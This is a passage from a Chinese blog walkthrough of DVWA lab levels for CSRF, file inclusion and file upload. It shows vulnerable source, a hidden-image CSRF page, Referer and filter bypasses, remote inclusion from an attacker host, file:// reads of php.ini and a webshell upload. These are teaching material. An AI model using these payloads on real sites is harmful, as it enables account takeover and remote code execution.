forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。</p></blockquote><p>说实话，都快忘光了。</p><h2 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">&quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制。</p><p>也就是说，以任何方式欺骗受害者点击这个链接或者伪装成别的样子的这个链接，都会导致用户密码更改</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.220.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;hack&amp;password_conf&#x3D;hack&amp;Change&#x3D;Change</span><br></pre></td></tr></table></figure><p>常见的伪装方式：</p><ol><li><p><strong>短链接来隐藏url</strong></p><p>需要注意的是，虽然利用了短链接隐藏url，但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也并不高明。</p><p><img src="https://i.loli.net/2020/03/01/W3GVqpayDh259od.png"></p></li><li><p><strong>精心构造攻击页面</strong></p><p>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;192.168.153.130&#x2F;dvwa&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;hack&amp;password_conf&#x3D;hack&amp;Change&#x3D;Change#&quot; border&#x3D;&quot;0&quot; style&#x3D;&quot;display:none;&quot;&#x2F;&gt;&lt;h1&gt;404&lt;h1&gt;&lt;h2&gt;file not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure><p>当受害者访问<code>test.html</code>时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了hack。而原来的密码password就登不上去了。</p><p><img src="https://i.loli.net/2020/03/01/iX4bgD3yxpfESTI.png"></p></li></ol><h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( stripos( $_SERVER[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,$_SERVER[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">        $pass_conf = $_GET[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            $insert = <span class="string">&quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">            $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn&#x27;t come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>stripos( <code>$string</code> ,<code>$pattern</code>)</p><p>string中pattern的位置，如果有返回位置序号，反之False。</p></blockquote><p>可以看到，Medium级别的代码检查了保留变量 <code>HTTP_REFERER</code>（http包头的Referer参数的值，表示来源地址）中是否包含<code>SERVER_NAME</code>（http包头的Host参数，及要访问的主机名，这里是<code>192.168.220.1</code>），希望通过这种机制抵御CSRF攻击。</p><p><strong>漏洞利用</strong></p><p>过滤规则是http包头的Referer参数的值中必须包含主机名（这里是<code>192.168.220.1</code>）我们可以将攻击页面命名为<code>192.168.220.1.html</code>或者放到文件夹<code>192.168.220.1</code>下</p><p><img src="https://i.loli.net/2020/03/03/Y9ljd3tPvcMraKy.png"></p><p><code>192.168.253.129</code>是攻击者的服务器。</p><h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">&quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，High级别的代码加入了<code>Anti-CSRF token</code>机制，用户每次访问改密页面时，服务器会返回一个随机的<code>token</code>，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p><p><strong>漏洞利用</strong></p><p>要绕过High级别的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。</p><p>这就需要利用XSS弹<code>cookie</code>，得到<code>cookie</code>中的<code>token</code>, 加入token后访问才行。</p><p>这里利用dvwa的存储型XSS的漏洞，来弹token。</p><h2 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_curr = $_GET[ <span class="string">&#x27;password_current&#x27;</span> ];</span><br><span class="line">    $pass_new  = $_GET[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise current password input</span></span><br><span class="line">    $pass_curr = stripslashes( $pass_curr );</span><br><span class="line">    $pass_curr = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_curr ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass_curr = md5( $pass_curr );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that the current password is correct</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, $pass_curr, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do both new passwords match and does the current password match the user?</span></span><br><span class="line">    <span class="keyword">if</span>( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == <span class="number">1</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// It does!</span></span><br><span class="line">        $pass_new = stripslashes( $pass_new );</span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database with new password</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, $pass_new, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。</p><h1 id="File-inclusion-文件包含"><a href="#File-inclusion-文件包含" class="headerlink" title="File inclusion(文件包含)"></a>File inclusion(文件包含)</h1><p>文件包含,分为两种：本地文件包含和远程文件包含。当服务器开启<code>allow_url_include</code>选项的时候，就可以通过php的包含函数（类似python，java的import）<code>include(),require(),require_once(),include_once()</code>利用url去动态包含文件，此时如果没有对文件来源进行检查，就容易导致任意文件读取和任意命令执行。</p><h2 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一行代码，十分简单，对page参数没有做任何的过滤跟检查。</p><blockquote><p>服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p></blockquote><p>page参数可控，可以先尝试本地文件包含。</p><p>尝试<code>?page=/etc/shadow</code></p><p>但是因为我的环境直接放在Windows，没有报错了，而且爆出了网站路径，可以进一步查找<code>php.ini</code>(php的配置文件)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?page&#x3D;D:\Environment\phpstudy_pro\WWW\dvwa\php.ini</span><br><span class="line">或者</span><br><span class="line">page&#x3D;..\..\..\..\..\..\..\Environment\phpstudy_pro\WWW\dvwa\php.ini</span><br><span class="line"></span><br><span class="line">This file attempts to overwrite the original php.ini file. Doesnt always work. </span><br><span class="line">magic_quotes_gpc &#x3D; Off </span><br><span class="line">allow_url_fopen on </span><br><span class="line">allow_url_include on</span><br></pre></td></tr></table></figure><p>发现是允许远程文件包含。配置文件中的<code>Magic_quote_gpc</code>选项为off。在php版本<code>&lt;5.3.4</code>的服务器中，当<code>Magic_quote_gpc</code>选项为off时，我们可以在文件名中使用<code>%00</code>进行截断，也就是说文件名中<code>%00</code>后的内容不会被识别。使用<code>%00</code>截断可以绕过某些过滤规则，例如要求page参数的后缀必须为php。</p><p>因为打开<code>allow_url_fopen</code>和<code>allow_url_include</code>还可以通过远程文件包含，可以通过远程文件包含，可以导致任意代码执行。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?page&#x3D;http:&#x2F;&#x2F;192.168.253.129&#x2F;test.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/01/s9JWv5jlnCxuPQL.png"></p><p>需要注意，文件是一般文件（比如txt），然后远程文件包含的时候当做php执行，这样就可以在靶机执行任意代码。但是如果远程包含一个php文件，就只是直接访问而已（以远程文件所在的服务器环境执行），而不是执行代码。如下（我的靶机是<code>Windows</code>, 远程文件放在<code>Linux</code>）：</p><p><img src="https://i.loli.net/2020/03/01/rovZbXY9ucGeatO.png"></p><h2 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2><p>相比于Low级别，加了一点过滤。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, $file );</span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, $file );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将<code>http://</code>或者<code>https://</code>或者<code>../</code>,<code>..\</code>替换成空。</p><p>但是这种程度的过滤，平角裤平角裤…</p><p>一方面，我们仍然可以通过双写绕过过滤字符，二方面，可以采用绝对路径进行本地文件包含。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?page&#x3D;htthttp:&#x2F;&#x2F;p:&#x2F;&#x2F;192.168.253.129&#x2F;test.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/03/FfQy6DwhJjGg1XI.png"></p><h2 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">&quot;file*&quot;</span>, $file ) &amp;&amp; $file != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>fnmatch ( string <code>$pattern</code> , string <code>$string</code> [, int <code>$flags</code> = 0 ] ) : bool</p><p><strong>fnmatch()</strong> 检查传入的 <code>string</code> 是否匹配给出的 shell 统配符 <code>pattern</code>。</p></blockquote><p>匹配文件名，只能是<code>file*</code>，但是我们依然可以利用<code>file://</code>协议来读取文件！</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?page&#x3D;file:&#x2F;&#x2F;&#x2F;D:&#x2F;Environment&#x2F;PhpStudy2018&#x2F;PHPTutorial&#x2F;WWW&#x2F;dvwa&#x2F;php.ini</span><br></pre></td></tr></table></figure><p>至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为php的文件，然后再利用file协议去包含（本地文件包含）上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。</p><h2 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;php</span><br><span class="line"><span class="comment">//Thepagewewishtodisplay</span></span><br><span class="line">$file=$_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//Onlyallowinclude.phporfile&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>($file!=<span class="string">&quot;include.php&quot;</span>&amp;&amp;$file!=<span class="string">&quot;file1.php&quot;</span>&amp;&amp;$file!=<span class="string">&quot;file2.php&quot;</span>&amp;&amp;$file!=<span class="string">&quot;file3.php&quot;</span>)&#123;</span><br><span class="line"><span class="comment">//Thisisn&#x27;tthepagewewant!</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;ERROR:Filenotfound!&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为<code>include.php、file1.php、file2.php、file3.php</code>之一，彻底杜绝了文件包含漏洞。</p><h1 id="File-Upload（文件上传）"><a href="#File-Upload（文件上传）" class="headerlink" title="File Upload（文件上传）"></a>File Upload（文件上传）</h1><p>上传文件漏洞，通常时候由于对上传文件的类型、内容没有做严格过滤检查，使得攻击者可以通过上传木马来getshell。</p><h2 id="Low-4"><a href="#Low-4" class="headerlink" title="Low"></a>Low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], $target_path ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>basename(path, suffix)</code></p><p>函数返回路径中的文件名部分，如果可选参数suffix为空，则返回的文件名包含后缀名，反之不包含后缀名。</p></blockquote><p>可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。</p><p>文件上传漏洞的利用是有限制条件的</p><ol><li><p>首先当然是要能够成功上传木马文件</p></li><li><p>其次上传文件必须能够被执行</p></li><li><p>最后就是上传文件的路径必须可知。</p></li></ol><p>不幸的是，这里三个条件全都满足。上传一个一句话木马。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;..&#x2F;hackable&#x2F;uploads&#x2F;v0w.php succesfully uploaded!</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/01/APCkEynZzlLwJFS.png"></p><h2 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span 